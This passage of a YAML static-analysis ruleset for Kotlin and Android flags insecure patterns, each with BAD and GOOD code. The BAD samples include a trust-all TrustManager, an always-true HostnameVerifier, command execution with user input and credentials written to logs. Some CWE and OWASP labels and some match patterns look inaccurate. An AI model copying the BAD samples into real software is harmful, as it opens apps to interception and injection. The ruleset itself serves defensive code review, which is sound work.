  ```xml

  <!-- BAD -->

  <domain-config cleartextTrafficPermitted="true">


  <!-- GOOD -->

  <domain-config cleartextTrafficPermitted="false">

  ```


  REFERENCES:

  - CWE-295: https://cwe.mitre.org/data/definitions/295.html

  - Android Network Security Config: https://developer.android.com/training/articles/security-config

  '
---
id: kotlin-cwe-295-certificate-validation-disabled
language: kotlin
severity: error
message: 'CWE-295: Disabled Certificate Validation'
tags:
- security
- network
- cryptography
- CWE-295
- OWASP-A02:Cryptographic-Failures
rule:
  kind: class_definition
  pattern: TrustManager.*accepts.*certificates
note: "Disabling certificate validation enables man-in-the-middle (MITM) attacks.\
  \ All\nTLS connections are vulnerable if certificates are not verified.\n\nREMEDIATION:\n\
  Use default TrustManager; implement proper certificate pinning if needed:\n```kotlin\n\
  // NEVER DO THIS\nval trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager\
  \ {\n    override fun checkClientTrusted(chain: Array<X509Certificate>, authType:\
  \ String) {}\n    override fun checkServerTrusted(chain: Array<X509Certificate>,\
  \ authType: String) {}\n    override fun getAcceptedIssuers(): Array<X509Certificate>\
  \ = arrayOf()\n})\n\n// GOOD - Use default trust manager\nval sslContext = SSLContext.getInstance(\"\
  TLS\")\nsslContext.init(null, null, null) // Uses default TrustManager\n```\n\n\
  REFERENCES:\n- CWE-295: https://cwe.mitre.org/data/definitions/295.html\n- Android\
  \ HTTPS: https://developer.android.com/training/articles/security-ssl\n"
---
id: kotlin-cwe-295-hostname-verification-disabled
language: kotlin
severity: error
message: 'CWE-295: Disabled Hostname Verification'
tags:
- security
- network
- cryptography
- CWE-295
- OWASP-A02:Cryptographic-Failures
rule:
  kind: lambda_expression
  pattern: HostnameVerifier.*true
note: 'Allows connections to any host, enabling man-in-the-middle attacks. The hostname

  must match the certificate''s CN or SAN field.


  REMEDIATION:

  Use default hostname verifier:

  ```kotlin

  // BAD

  val verifier = HostnameVerifier { _, _ -> true }


  // GOOD

  // Use default - don''t override

  // Or use explicit checking

  val verifier = HttpsURLConnection.getDefaultHostnameVerifier()

  ```


  REFERENCES:

  - CWE-295: https://cwe.mitre.org/data/definitions/295.html

  - OWASP Transport Layer Security: https://owasp.org/www-project-cheat-sheets/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html

  '
---
id: kotlin-cwe-295-old-tls-version
language: kotlin
severity: error
message: 'CWE-295: SSLv3/TLSv1.0/TLSv1.1 Usage'
tags:
- security
- network
- cryptography
- CWE-295
- OWASP-A02:Cryptographic-Failures
rule:
  kind: call_expression
  pattern: SSLContext.getInstance("SSL"|"TLSv1"|"TLSv1.1")
note: 'Older TLS versions have known vulnerabilities (POODLE, BEAST, etc.). Modern
  applications

  must use TLSv1.2 or TLSv1.3.


  REMEDIATION:

  Use TLSv1.2 or TLSv1.3 minimum:

  ```kotlin

  // BAD

  val context = SSLContext.getInstance("SSLv3")

  val context = SSLContext.getInstance("TLSv1")


  // GOOD

  val context = SSLContext.getInstance("TLSv1.2")

  // or

  val context = SSLContext.getInstance("TLSv1.3")

  ```


  REFERENCES:

  - CWE-295: https://cwe.mitre.org/data/definitions/295.html

  - Android Network Security: https://developer.android.com/training/articles/security-ssl

  '
---
id: kotlin-cwe-295-websocket-unencrypted
language: kotlin
severity: error
message: 'CWE-295: WebSocket Over WS (Not WSS)'
tags:
- security
- network
- CWE-295
- OWASP-A02:Cryptographic-Failures
rule:
  kind: string_literal
  pattern: ws://
note: 'Unencrypted WebSocket traffic can be intercepted and modified. WebSockets should

  always use WSS (WebSocket Secure) for encrypted connections.


  REMEDIATION:

  Use wss:// for secure WebSocket connections:

  ```kotlin

  // BAD

  val webSocket = client.newWebSocket(Request.Builder().url("ws://server.example.com").build(),
  ...)


  // GOOD

  val webSocket = client.newWebSocket(Request.Builder().url("wss://server.example.com").build(),
  ...)

  ```


  REFERENCES:

  - CWE-295: https://cwe.mitre.org/data/definitions/295.html

  - OWASP WebSocket Security: https://owasp.org/www-project-web-security-testing-guide/

  '
---
id: kotlin-cwe-295-missing-certificate-pinning
language: kotlin
severity: warning
message: 'CWE-295: Missing Certificate Pinning'
tags:
- security
- network
- cryptography
- CWE-295
- OWASP-A02:Cryptographic-Failures
rule:
  kind: missing_call
  pattern: CertificatePinner
note: "Without certificate pinning, compromised or rogue CAs can issue fraudulent\
  \ certificates\nfor your domain. Pinning ensures only your certificates are trusted.\n\
  \nREMEDIATION:\nImplement certificate pinning for sensitive API endpoints:\n```kotlin\n\
  // GOOD - Certificate Pinning\nval certificatePinner = CertificatePinner.Builder()\n\
  \    .add(\"api.example.com\", \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"\
  )\n    .add(\"api.example.com\", \"sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=\"\
  ) // Backup\n    .build()\n\nval client = OkHttpClient.Builder()\n    .certificatePinner(certificatePinner)\n\
  \    .build()\n```\n\nREFERENCES:\n- CWE-295: https://cwe.mitre.org/data/definitions/295.html\n\
  - OkHttp Certificate Pinning: https://square.github.io/okhttp/features/https/\n"
---
id: kotlin-cwe-295-single-pin-no-backup
language: kotlin
severity: warning
message: 'CWE-295: Single Pin Without Backup'
tags:
- security
- network
- cryptography
- CWE-295
rule:
  kind: call_expression
  pattern: CertificatePinner.*one.*hash
note: "Single certificate pin without backup can cause app lockout if certificate\
  \ rotates.\nUsers cannot access the service if the pinned certificate expires.\n\
  \nREMEDIATION:\nInclude at least two pins: current and backup certificate:\n```kotlin\n\
  // BAD - Single pin\nval pinner = CertificatePinner.Builder()\n    .add(\"api.example.com\"\
  , \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\")\n    .build()\n\n// GOOD\
  \ - Multiple pins\nval pinner = CertificatePinner.Builder()\n    .add(\"api.example.com\"\
  , \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\") // Current\n    .add(\"\
  api.example.com\", \"sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=\") // Backup\n\
  \    .build()\n```\n\nREFERENCES:\n- CWE-295: https://cwe.mitre.org/data/definitions/295.html\n\
  - Netguru Certificate Pinning: https://www.netguru.com/blog/android-certificate-pinning\n"
---
id: kotlin-cwe-295-pinning-expiration-planning
language: kotlin
severity: info
message: 'CWE-295: Pinning Without Expiration Planning'
tags:
- security
- network
- cryptography
- CWE-295
rule:
  kind: missing_comment
  pattern: CertificatePinner.*expiration|rotation
note: "Pins must be updated when certificates rotate. Without planning, apps will\
  \ break\nwhen pinned certificates expire.\n\nREMEDIATION:\nDocument certificate\
  \ expiration dates; plan updates before expiration:\n```kotlin\n// GOOD - With rotation\
  \ strategy documented\nval pinner = CertificatePinner.Builder()\n    // Expires:\
  \ 2026-01-15\n    .add(\"api.example.com\", \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"\
  )\n    // Backup, expires: 2025-06-30\n    .add(\"api.example.com\", \"sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=\"\
  )\n    .build()\n```\n\nREFERENCES:\n- CWE-295: https://cwe.mitre.org/data/definitions/295.html\n\
  - droidcon SSL Pinning: https://www.droidcon.com/2024/07/11/enhancing-security-in-android-applications-with-ssl-pinning/\n"
---
id: kotlin-cwe-276-world-readable-files
language: kotlin
severity: error
message: 'CWE-276: MODE_WORLD_READABLE/MODE_WORLD_WRITEABLE'
tags:
- security
- data-storage
- CWE-276
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: constant_reference
  pattern: MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE
note: 'These modes allow any app to read/write your files. This is deprecated since
  API 17

  and poses severe security risks by exposing application data.


  REMEDIATION:

  Use MODE_PRIVATE; share data via ContentProvider with proper permissions:

  ```kotlin

  // BAD - Never use these

  getSharedPreferences("prefs", Context.MODE_WORLD_READABLE)


  // GOOD

  getSharedPreferences("prefs", Context.MODE_PRIVATE)

  ```


  REFERENCES:

  - CWE-276: https://cwe.mitre.org/data/definitions/276.html

  - Android SharedPreferences: https://developer.android.com/training/data-storage/shared-preferences

  '
---
id: kotlin-cwe-312-plaintext-storage-sensitive-data
language: kotlin
severity: error
message: 'CWE-312: Sensitive Data in SharedPreferences'
tags:
- security
- data-storage
- CWE-312
- OWASP-A02:Cryptographic-Failures
- android
rule:
  kind: call_expression
  pattern: putString("password"|putString("token")
note: "SharedPreferences are stored in plain XML, accessible with root privileges.\
  \ Sensitive\ndata stored here is exposed to any app with device access.\n\nREMEDIATION:\n\
  Use EncryptedSharedPreferences from AndroidX Security:\n```kotlin\n// BAD\nsharedPrefs.edit().putString(\"\
  auth_token\", token).apply()\n\n// GOOD\nval masterKey = MasterKey.Builder(context)\n\
  \    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)\n    .build()\n\nval encryptedPrefs\
  \ = EncryptedSharedPreferences.create(\n    context,\n    \"secret_prefs\",\n  \
  \  masterKey,\n    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,\n\
  \    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM\n)\nencryptedPrefs.edit().putString(\"\
  auth_token\", token).apply()\n```\n\nREFERENCES:\n- CWE-312: https://cwe.mitre.org/data/definitions/312.html\n\
  - Android EncryptedSharedPreferences: https://developer.android.com/reference/androidx/security/crypto/EncryptedSharedPreferences\n"
---
id: kotlin-cwe-434-external-storage-sensitive-data
language: kotlin
severity: error
message: 'CWE-434: External Storage for Sensitive Data'
tags:
- security
- data-storage
- CWE-434
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: call_expression
  pattern: getExternalStorageDirectory()
note: 'External storage is world-readable on many devices. Any sensitive data stored

  there is exposed to all applications and can be extracted.


  REMEDIATION:

  Use internal storage or encrypted external files:

  ```kotlin

  // BAD

  val file = File(context.getExternalStorageDirectory(), "sensitive.txt")


  // GOOD

  // Use internal storage (private to app)

  val file = File(context.filesDir, "sensitive.txt")


  // Or use encrypted external files

  val file = File(context.getExternalFilesDir(null), "sensitive.txt")

  ```


  REFERENCES:

  - CWE-434: https://cwe.mitre.org/data/definitions/434.html

  - Android Data Storage: https://developer.android.com/training/data-storage

  '
---
id: kotlin-cwe-311-unencrypted-database
language: kotlin
severity: warning
message: 'CWE-311: SQLite Database Without Encryption'
tags:
- security
- data-storage
- CWE-311
- OWASP-A02:Cryptographic-Failures
- android
rule:
  kind: class_definition
  pattern: SQLiteOpenHelper
note: "Unencrypted databases are readable if device is compromised or accessed. Sensitive\n\
  application data should be encrypted at rest.\n\nREMEDIATION:\nUse SQLCipher for\
  \ Android or Room with encryption:\n```kotlin\n// BAD - Unencrypted\nclass MyDbHelper(context:\
  \ Context) : SQLiteOpenHelper(context, \"mydb\", null, 1)\n\n// GOOD - Encrypted\
  \ with SQLCipher\nval db = SQLiteDatabase.openDatabase(\"mydb\", \"password\".toByteArray(),\
  \ null, SQLiteDatabase.OPEN_READWRITE)\n\n// Or use Room with encryption\nval db\
  \ = Room.databaseBuilder(context, MyDatabase::class.java, \"mydb\")\n    .openHelperFactory(SafeHelperFactory(\"\
  password\".toByteArray()))\n    .build()\n```\n\nREFERENCES:\n- CWE-311: https://cwe.mitre.org/data/definitions/311.html\n\
  - SQLCipher for Android: https://www.zetetic.net/sqlcipher/sqlcipher-for-android/\n"
---
id: kotlin-cwe-530-backup-enabled-sensitive
language: kotlin
severity: warning
message: 'CWE-530: Backup Enabled for Sensitive Data'
tags:
- security
- data-storage
- CWE-530
- android
rule:
  kind: manifest_attribute
  pattern: android:allowBackup="true"
note: 'Backup data can be extracted via ADB or restored to attacker device. Sensitive
  app

  data should not be included in Android backups.


  REMEDIATION:

  Set android:allowBackup="false" or exclude sensitive files:

  ```xml

  <!-- BAD -->

  <application android:allowBackup="true">


  <!-- GOOD -->

  <application android:allowBackup="false">


  <!-- Or disable for specific data -->

  <activity android:dataExtractionRules="@xml/data_extraction_rules" />

  ```


  REFERENCES:

  - CWE-530: https://cwe.mitre.org/data/definitions/530.html

  - Android Backup: https://developer.android.com/guide/topics/data/autobackup

  '
---
id: kotlin-cwe-312-sensitive-cache
language: kotlin
severity: warning
message: 'CWE-312: Sensitive Data in Cache Directory'
tags:
- security
- data-storage
- CWE-312
- OWASP-A02:Cryptographic-Failures
- android
rule:
  kind: call_expression
  pattern: cacheDir
note: 'Cache may be accessible by other apps or persisted unexpectedly. Sensitive
  data

  should not be stored in cache directories.


  REMEDIATION:

  Use encrypted internal storage for sensitive data:

  ```kotlin

  // BAD

  val file = File(context.cacheDir, "sensitive_data.txt")


  // GOOD

  val file = File(context.filesDir, "sensitive_data.txt")

  // Then encrypt before storing

  ```


  REFERENCES:

  - CWE-312: https://cwe.mitre.org/data/definitions/312.html

  - Android Cache Directory: https://developer.android.com/training/data-storage/app-specific

  '
---
id: kotlin-cwe-532-logging-passwords
language: kotlin
severity: error
message: 'CWE-532: Logging Passwords'
tags:
- security
- logging
- CWE-532
- OWASP-A09:Security-Logging-and-Monitoring-Failures
rule:
  kind: call_expression
  pattern: Log.*password|println.*password
note: 'Logged passwords appear in logcat, accessible to other apps via adb. This compromises

  the password immediately.


  REMEDIATION:

  Never log passwords or authentication credentials:

  ```kotlin

  // BAD - NEVER DO THIS

  Log.d(TAG, "User password: $password")


  // GOOD

  Log.d(TAG, "Password validation completed")

  ```


  REFERENCES:

  - CWE-532: https://cwe.mitre.org/data/definitions/532.html

  - Android Log Info Disclosure: https://developer.android.com/privacy-and-security/risks/log-info-disclosure

  '
---
id: kotlin-cwe-532-logging-api-keys
language: kotlin
severity: error
message: 'CWE-532: Logging API Keys/Tokens'
tags:
- security
- logging
- CWE-532
- OWASP-A09:Security-Logging-and-Monitoring-Failures
rule:
  kind: call_expression
  pattern: Log.*(api|token|key|secret)
note: 'API keys in logs can be extracted and abused. These are high-value targets
  for

  attackers scanning logs.


  REMEDIATION:

  Never log authentication tokens or API keys:

  ```kotlin

  // BAD

  Log.d(TAG, "API Key: $apiKey")


  // GOOD

  Log.d(TAG, "API authentication successful")

  ```


  REFERENCES:

  - CWE-532: https://cwe.mitre.org/data/definitions/532.html

  - OWASP Logging Cheat Sheet: https://owasp.org/www-project-cheat-sheets/cheatsheets/Logging_Cheat_Sheet.html

  '
---
id: kotlin-cwe-532-logging-pii
language: kotlin
severity: error
message: 'CWE-532: Logging PII'
tags:
- security
- logging
- CWE-532
- OWASP-A09:Security-Logging-and-Monitoring-Failures
- privacy
rule:
  kind: call_expression
  pattern: Log.*(email|phone|ssn|address|name.*user)
note: 'PII in logs violates privacy regulations (GDPR, CCPA). Logged PII can be extracted

  by attackers or accessed by developers with logcat access.


  REMEDIATION:

  Mask or exclude PII from logs; use proper anonymization:

  ```kotlin

  // BAD

  Log.d(TAG, "User email: $email, phone: $phone")


  // GOOD

  Log.d(TAG, "User authentication succeeded")

  // Or mask: email.replace(Regex("(\\w)[\\w.-]*@"), "$1***@")

  ```


  REFERENCES:

  - CWE-532: https://cwe.mitre.org/data/definitions/532.html

  - Better Stack Logging Guide: https://betterstack.com/community/guides/logging/sensitive-data/

  '
---
id: kotlin-cwe-532-exception-sensitive-data
language: kotlin
severity: error
message: 'CWE-532: Exception Message with Sensitive Data'
tags:
- security
- logging
- CWE-532
- OWASP-A09:Security-Logging-and-Monitoring-Failures
rule:
  kind: throw_statement
  pattern: throw.*Exception.*\$sensitiveData
note: 'Exception messages may be logged or displayed to users. Including sensitive
  data

  in exceptions exposes it unintentionally.


  REMEDIATION:

  Use generic error messages; log sensitive details separately if needed:

  ```kotlin

  // BAD

  throw Exception("Failed to process user: ${userData.password}")


  // GOOD

  throw Exception("Failed to process user")

  // Log separately if needed:

  Log.d(TAG, "Detailed error: ${userData.id}")

  ```


  REFERENCES:

  - CWE-532: https://cwe.mitre.org/data/definitions/532.html

  - kotlinx.serialization Issue #2590: https://github.com/Kotlin/kotlinx.serialization/issues/2590

  '
---
id: kotlin-cwe-532-tostring-leaking
language: kotlin
severity: warning
message: 'CWE-532: toString() Leaking Sensitive Data'
tags:
- security
- logging
- CWE-532
- OWASP-A09:Security-Logging-and-Monitoring-Failures
rule:
  kind: class_definition
  pattern: data class.*password|data class.*token
note: "Default toString() in data classes includes all fields, which may be logged\
  \ when\nprinting objects for debugging.\n\nREMEDIATION:\nOverride toString() to\
  \ exclude sensitive fields:\n```kotlin\n// BAD\ndata class User(val name: String,\
  \ val password: String)\n// User(name=John, password=secret123)\n\n// GOOD\ndata\
  \ class User(val name: String, val password: String) {\n    override fun toString()\
  \ = \"User(name=$name, password=***)\"\n}\n```\n\nREFERENCES:\n- CWE-532: https://cwe.mitre.org/data/definitions/532.html\n\
  - Kotlin Data Classes: https://kotlinlang.org/docs/data-classes.html\n"
---
id: kotlin-cwe-532-verbose-logs-release
language: kotlin
severity: warning
message: 'CWE-532: Verbose Logging in Release Builds'
tags:
- security
- logging
- CWE-532
- performance
rule:
  kind: call_expression
  pattern: Log.v|Log.d
note: "Debug logs in production waste resources and may leak information. Release\
  \ builds\nshould have logging disabled or restricted to important messages.\n\n\
  REMEDIATION:\nUse Timber or wrap logs with BuildConfig.DEBUG check:\n```kotlin\n\
  // BAD\nLog.d(TAG, \"Debug information: $debugData\")\n\n// GOOD\nif (BuildConfig.DEBUG)\
  \ {\n    Log.d(TAG, \"Debug information: $debugData\")\n}\n\n// Or use Timber which\
  \ strips logs in production\nTimber.d(\"Debug information: %s\", debugData)\n```\n\
  \nREFERENCES:\n- CWE-532: https://cwe.mitre.org/data/definitions/532.html\n- Android\
  \ Logging Best Practices: https://developer.android.com/studio/debug/am-logcat\n"
---
id: kotlin-cwe-502-deserialization-untrusted
language: kotlin
severity: error
message: 'CWE-502: Deserializing Untrusted Data'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08:Software-and-Data-Integrity-Failures
rule:
  kind: call_expression
  pattern: ObjectInputStream
note: 'Java deserialization can lead to remote code execution through gadget chains.

  Untrusted data should never be deserialized using ObjectInputStream.


  REMEDIATION:

  Avoid ObjectInputStream; use JSON or Protocol Buffers with validation:

  ```kotlin

  // BAD

  val ois = ObjectInputStream(inputStream)

  val obj = ois.readObject()


  // GOOD

  val json = inputStream.bufferedReader().readText()

  val obj = Json.decodeFromString<MyClass>(json)

  ```


  REFERENCES:

  - CWE-502: https://cwe.mitre.org/data/definitions/502.html

  - Android Unsafe Deserialization: https://developer.android.com/privacy-and-security/risks/unsafe-deserialization

  '
---
id: kotlin-cwe-502-parcel-deserialization
language: kotlin
severity: error
message: 'CWE-502: Parcel from Untrusted Source'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08:Software-and-Data-Integrity-Failures
- android
rule:
  kind: call_expression
  pattern: intent.getParcelableExtra
note: 'Parcels can contain malicious objects leading to exploitation. Without type
  verification,

  attackers can instantiate arbitrary classes.


  REMEDIATION:

  Use type-safe methods like getParcelableExtra(String, Class) on API 33+:

  ```kotlin

  // OLD (vulnerable on older APIs)

  val user = intent.getParcelableExtra("user") as User


  // NEW (API 33+, safer)

  val user = intent.getParcelableExtra("user", User::class.java)

  ```


  REFERENCES:

  - CWE-502: https://cwe.mitre.org/data/definitions/502.html

  - Android Unsafe Deserialization: https://developer.android.com/privacy-and-security/risks/unsafe-deserialization

  '
---
id: kotlin-cwe-502-kotlinx-deserialization
language: kotlin
severity: warning
message: 'CWE-502: kotlinx.serialization Without Validation'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08:Software-and-Data-Integrity-Failures
rule:
  kind: call_expression
  pattern: Json.decodeFromString
note: "Deserializing untrusted JSON can cause unexpected behavior or crashes. Input\
  \ should\nbe validated for schema compliance before deserialization.\n\nREMEDIATION:\n\
  Validate input before deserialization; use try-catch for errors:\n```kotlin\n//\
  \ BAD\nval obj = Json.decodeFromString<MyClass>(untrustedInput)\n\n// GOOD\ntry\
  \ {\n    val obj = Json.decodeFromString<MyClass>(untrustedInput)\n    // Validate\
  \ object state\n    require(obj.isValid()) { \"Invalid object\" }\n} catch (e: Exception)\
  \ {\n    Log.e(TAG, \"Deserialization failed\", e)\n    return null\n}\n```\n\n\
  REFERENCES:\n- CWE-502: https://cwe.mitre.org/data/definitions/502.html\n- kotlinx.serialization\
  \ Security: https://github.com/Kotlin/kotlinx.serialization/issues/8\n"
---
id: kotlin-cwe-502-gson-adapter-validation
language: kotlin
severity: warning
message: 'CWE-502: Gson TypeAdapter Without Validation'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08:Software-and-Data-Integrity-Failures
rule:
  kind: class_definition
  pattern: TypeAdapter
note: "Custom deserializers may not properly validate input. All fields should be\
  \ validated\nfor type safety and business logic constraints.\n\nREMEDIATION:\nValidate\
  \ all deserialized fields; handle null and invalid values:\n```kotlin\n// GOOD\n\
  class SafeTypeAdapter : TypeAdapter<MyClass>() {\n    override fun read(reader:\
  \ JsonReader): MyClass {\n        val name = reader.nextString()\n        require(name.isNotEmpty())\
  \ { \"Name cannot be empty\" }\n        val age = reader.nextInt()\n        require(age\
  \ >= 0 && age <= 150) { \"Invalid age\" }\n        return MyClass(name, age)\n \
  \   }\n}\n```\n\nREFERENCES:\n- CWE-502: https://cwe.mitre.org/data/definitions/502.html\n\
  - Gson Security Best Practices: https://github.com/google/gson\n"
---
id: kotlin-cwe-502-bundle-gadget
language: kotlin
severity: error
message: 'CWE-502: Bundle Deserialization Gadgets'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08:Software-and-Data-Integrity-Failures
- android
rule:
  kind: call_expression
  pattern: bundle.getSerializable
note: "Bundle deserialization can be exploited with gadget chains. Arbitrary Serializable\n\
  classes can be instantiated, potentially executing attacker code.\n\nREMEDIATION:\n\
  Use type-safe Bundle methods; validate class types:\n```kotlin\n// BAD\nval obj\
  \ = bundle.getSerializable(\"data\")\n\n// GOOD\nval obj = bundle.getBundle(\"data\"\
  )?.let {\n    // Only deserialize known types\n    val className = it.getString(\"\
  class\")\n    if (className == \"com.example.MyClass\") {\n        MyClass.fromBundle(it)\n\
  \    } else {\n        null\n    }\n}\n```\n\nREFERENCES:\n- CWE-502: https://cwe.mitre.org/data/definitions/502.html\n\
  - Android Parcel Security: https://developer.android.com/reference/android/os/Parcel\n"
---
id: kotlin-cwe-926-exported-activity
language: kotlin
severity: error
message: 'CWE-926: Exported Activity Without Permission'
tags:
- security
- component-security
- CWE-926
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: manifest_element
  pattern: <activity android:exported="true">
note: "Exported activities can be launched by any app. This allows attackers to access\n\
  sensitive functionality or navigate to unintended screens.\n\nREMEDIATION:\nSet\
  \ exported=\"false\" or require permission for sensitive activities:\n```xml\n<!--\
  \ BAD -->\n<activity android:name=\".SecureActivity\" android:exported=\"true\"\
  \ />\n\n<!-- GOOD -->\n<activity android:name=\".SecureActivity\" android:exported=\"\
  false\" />\n\n<!-- Or require permission -->\n<activity android:name=\".PublicActivity\"\
  \ android:exported=\"true\"\n    android:permission=\"com.example.ACCESS_ACTIVITY\"\
  \ />\n```\n\nREFERENCES:\n- CWE-926: https://cwe.mitre.org/data/definitions/926.html\n\
  - Android App Security Best Practices: https://developer.android.com/topic/security/best-practices\n"
---
id: kotlin-cwe-926-exported-provider
language: kotlin
severity: error
message: 'CWE-926: Exported ContentProvider Without Permission'
tags:
- security
- component-security
- CWE-926
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: manifest_element
  pattern: <provider android:exported="true">
note: "Unprotected ContentProviders expose data to all apps. Without proper permissions,\n\
  any application can read and write your data.\n\nREMEDIATION:\nSet grantUriPermissions\
  \ properly; require read/write permissions:\n```xml\n<!-- BAD -->\n<provider android:name=\"\
  .MyProvider\" android:exported=\"true\" android:authorities=\"com.example.provider\"\
  \ />\n\n<!-- GOOD -->\n<provider android:name=\".MyProvider\" android:exported=\"\
  true\" android:authorities=\"com.example.provider\"\n    android:readPermission=\"\
  com.example.READ_DATA\"\n    android:writePermission=\"com.example.WRITE_DATA\"\
  \ />\n```\n\nREFERENCES:\n- CWE-926: https://cwe.mitre.org/data/definitions/926.html\n\
  - Android ContentProvider Security: https://developer.android.com/guide/topics/providers/content-provider-creating\n"
---
id: kotlin-cwe-489-debuggable-production
language: kotlin
severity: error
message: 'CWE-489: Debuggable in Production'
tags:
- security
- component-security
- CWE-489
- OWASP-A05:Broken-Access-Control
- android
rule:
  kind: manifest_attribute
  pattern: android:debuggable="true"
note: "Debuggable apps can be attached with debugger, exposing internals. This allows\n\
  attackers to step through code, inspect memory, and modify behavior at runtime.\n\
  \nREMEDIATION:\nNever set debuggable=\"true\" in release builds; rely on build variants:\n\
  ```xml\n<!-- BAD in AndroidManifest.xml -->\n<application android:debuggable=\"\
  true\">\n\n<!-- GOOD - Use BuildConfig in code or build variants -->\n```\n\nbuild.gradle:\n\
  ```gradle\nbuildTypes {\n    debug { debuggable true }\n    release { debuggable\
  \ false }\n}\n```\n\nREFERENCES:\n- CWE-489: https://cwe.mitre.org/data/definitions/489.html\n\
  - Android Security Best Practices: https://developer.android.com/topic/security/best-practices\n"
---
id: kotlin-cwe-916-task-affinity-hijack
language: kotlin
severity: warning
message: 'CWE-916: TaskAffinity Hijacking'
tags:
- security
- component-security
- CWE-916
- android
rule:
  kind: manifest_attribute
  pattern: android:taskAffinity
note: 'Improper task affinity can allow UI spoofing attacks where attacker activities

  appear to be part of your app.


  REMEDIATION:

  Use default task affinity or carefully configure task relationships:

  ```xml

  <!-- BAD - Custom affinity can be hijacked -->

  <activity android:name=".LoginActivity" android:taskAffinity="com.example.custom"
  />


  <!-- GOOD - Use default (remove taskAffinity) -->

  <activity android:name=".LoginActivity" />

  ```


  REFERENCES:

  - CWE-916: https://cwe.mitre.org/data/definitions/916.html

  - Android Task Affinity: https://developer.android.com/guide/components/activities/tasks-and-back-stack

  '
---
id: kotlin-cwe-276-insecure-permission
language: kotlin
severity: warning
message: 'CWE-276: Insecure Custom Permissions'
tags:
- security
- component-security
- CWE-276
- OWASP-A01:Broken-Access-Control
- android
rule:
  kind: manifest_element
  pattern: <permission android:protectionLevel="normal">
note: 'Normal permissions are granted automatically without user approval. Sensitive

  operations should require explicit user consent.


  REMEDIATION:

  Use signature or signatureOrSystem for sensitive permissions:

  ```xml

  <!-- BAD -->

  <permission android:name="com.example.MY_PERMISSION" android:protectionLevel="normal"
  />


  <!-- GOOD -->

  <permission android:name="com.example.MY_PERMISSION" android:protectionLevel="signature"
  />

  ```


  REFERENCES:

  - CWE-276: https://cwe.mitre.org/data/definitions/276.html

  - Android Custom Permissions: https://developer.android.com/guide/topics/permissions/defining

  '
---
id: kotlin-cwe-95-fragment-injection
language: kotlin
severity: error
message: 'CWE-95: Fragment Injection'
tags:
- security
- injection
- CWE-95
- OWASP-A03:Injection
- android
rule:
  kind: call_expression
  pattern: getStringExtra("fragment")
note: "Attackers can inject arbitrary fragment class names which get instantiated\
  \ dynamically.\nThis allows loading of unintended fragments.\n\nREMEDIATION:\nValidate\
  \ fragment class names against whitelist:\n```kotlin\n// BAD\nval fragmentClass\
  \ = intent.getStringExtra(\"fragment\")\nval fragment = supportFragmentManager.fragmentFactory.instantiate(\n\
  \    ClassLoader.getSystemClassLoader(),\n    fragmentClass\n)\n\n// GOOD\nval fragmentName\
  \ = intent.getStringExtra(\"fragment\")\nif (fragmentName in ALLOWED_FRAGMENTS)\
  \ {\n    val fragment = supportFragmentManager.fragmentFactory.instantiate(\n  \
  \      ClassLoader.getSystemClassLoader(),\n        fragmentName\n    )\n}\n\ncompanion\
  \ object {\n    private val ALLOWED_FRAGMENTS = setOf(\n        \"com.example.HomeFragment\"\
  ,\n        \"com.example.SettingsFragment\"\n    )\n}\n```\n\nREFERENCES:\n- CWE-95:\
  \ https://cwe.mitre.org/data/definitions/95.html\n- Android Fragment Injection:\
  \ https://securityintelligence.com/android-collapses-into-fragments/\n"
---
id: kotlin-cwe-78-command-injection
language: kotlin
severity: error
message: 'CWE-78: Runtime.exec with User Input'
tags:
- security
- injection
- CWE-78
- OWASP-A03:Injection
rule:
  kind: call_expression
  pattern: Runtime.getRuntime().exec(\$userInput)
note: "Command injection allows arbitrary command execution. User input should never\
  \ be\npassed directly to exec().\n\nREMEDIATION:\nNever use user input in exec();\
  \ use ProcessBuilder with argument array:\n```kotlin\n// BAD\nRuntime.getRuntime().exec(\"\
  ls \" + userDirectory)\n\n// GOOD\nProcessBuilder(\"ls\", userDirectory)\n    .start()\n\
  ```\n\nREFERENCES:\n- CWE-78: https://cwe.mitre.org/data/definitions/78.html\n-\
  \ OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection\n"
---
id: kotlin-cwe-470-reflection-code-execution
language: kotlin
severity: error
message: 'CWE-470: Reflection on User Input'
tags:
- security
- injection
- CWE-470
- OWASP-A03:Injection
rule:
  kind: call_expression
  pattern: Class.forName(\$userInput)
note: "Arbitrary class loading can lead to code execution. User input should never\
  \ be used\nto dynamically load classes.\n\nREMEDIATION:\nWhitelist allowed class\
  \ names:\n```kotlin\n// BAD\nval clazz = Class.forName(userProvidedClassName)\n\n\
  // GOOD\nval clazz = when (userInput) {\n    \"User\" -> User::class.java\n    \"\
  Product\" -> Product::class.java\n    else -> throw IllegalArgumentException(\"\
  Unknown class\")\n}\n```\n\nREFERENCES:\n- CWE-470: https://cwe.mitre.org/data/definitions/470.html\n\
  - Java Reflection Security: https://www.oracle.com/technical-resources/articles/java/javareflection.html\n"
---
id: kotlin-cwe-359-clipboard-sensitive-data
language: kotlin
severity: warning
message: 'CWE-359: Insecure Clipboard Operations'
tags:
- security
- privacy
- CWE-359
- android
rule:
  kind: call_expression
  pattern: ClipboardManager.setPrimaryClip
